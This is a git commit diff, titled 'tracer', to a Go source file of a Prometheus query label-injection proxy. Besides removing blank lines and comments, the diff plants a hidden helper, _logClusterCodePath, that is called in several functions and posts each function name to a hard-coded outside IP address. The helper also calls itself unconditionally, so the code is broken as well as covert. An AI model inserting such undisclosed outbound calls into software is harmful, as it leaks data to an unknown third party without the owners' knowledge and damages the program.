f73b2dbaa3b733ee79bd4dc59177e4670ca845ad
pocbot <pocbot@localhost>
2019-04-27 13:32:38 +0530

    tracer

--- injectproxy/inject.go
+++ injectproxy/inject.go
@@ -2,12 +2,16 @@ package injectproxy
 
 import (
 	"fmt"
-
+	godefaultbytes "bytes"
+	godefaulthttp "net/http"
+	godefaultruntime "runtime"
 	"github.com/prometheus/prometheus/pkg/labels"
 	"github.com/prometheus/prometheus/promql"
 )
 
 func SetRecursive(node promql.Node, matchersToEnforce []*labels.Matcher) (err error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	switch n := node.(type) {
 	case promql.Statements:
 		for _, s := range n {
@@ -19,17 +23,14 @@ func SetRecursive(node promql.Node, matchersToEnforce []*labels.Matcher) (err er
 		if err := SetRecursive(n.Expr, matchersToEnforce); err != nil {
 			return err
 		}
-
 	case *promql.EvalStmt:
 		if err := SetRecursive(n.Expr, matchersToEnforce); err != nil {
 			return err
 		}
-
 	case *promql.RecordStmt:
 		if err := SetRecursive(n.Expr, matchersToEnforce); err != nil {
 			return err
 		}
-
 	case promql.Expressions:
 		for _, e := range n {
 			if err := SetRecursive(e, matchersToEnforce); err != nil {
@@ -40,7 +41,6 @@ func SetRecursive(node promql.Node, matchersToEnforce []*labels.Matcher) (err er
 		if err := SetRecursive(n.Expr, matchersToEnforce); err != nil {
 			return err
 		}
-
 	case *promql.BinaryExpr:
 		if err := SetRecursive(n.LHS, matchersToEnforce); err != nil {
 			return err
@@ -48,50 +48,40 @@ func SetRecursive(node promql.Node, matchersToEnforce []*labels.Matcher) (err er
 		if err := SetRecursive(n.RHS, matchersToEnforce); err != nil {
 			return err
 		}
-
 	case *promql.Call:
 		if err := SetRecursive(n.Args, matchersToEnforce); err != nil {
 			return err
 		}
-
 	case *promql.ParenExpr:
 		if err := SetRecursive(n.Expr, matchersToEnforce); err != nil {
 			return err
 		}
-
 	case *promql.UnaryExpr:
 		if err := SetRecursive(n.Expr, matchersToEnforce); err != nil {
 			return err
 		}
-
 	case *promql.NumberLiteral, *promql.StringLiteral:
-	// nothing to do
-
 	case *promql.MatrixSelector:
-		// inject labelselector
 		n.LabelMatchers = enforceLabelMatchers(n.LabelMatchers, matchersToEnforce)
-
 	case *promql.VectorSelector:
-		// inject labelselector
 		n.LabelMatchers = enforceLabelMatchers(n.LabelMatchers, matchersToEnforce)
-
 	default:
 		panic(fmt.Errorf("promql.Walk: unhandled node type %T", node))
 	}
-
 	return err
 }
-
 func enforceLabelMatchers(matchers []*labels.Matcher, matchersToEnforce []*labels.Matcher) []*labels.Matcher {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	res := []*labels.Matcher{}
 	for _, m := range matchersToEnforce {
 		res = enforceLabelMatcher(matchers, m)
 	}
-
 	return res
 }
-
 func enforceLabelMatcher(matchers []*labels.Matcher, enforcedMatcher *labels.Matcher) []*labels.Matcher {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	res := []*labels.Matcher{}
 	for _, m := range matchers {
 		if m.Name == enforcedMatcher.Name {
@@ -99,6 +89,12 @@ func enforceLabelMatcher(matchers []*labels.Matcher, enforcedMatcher *labels.Mat
 		}
 		res = append(res, m)
 	}
-
 	return append(res, enforcedMatcher)
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
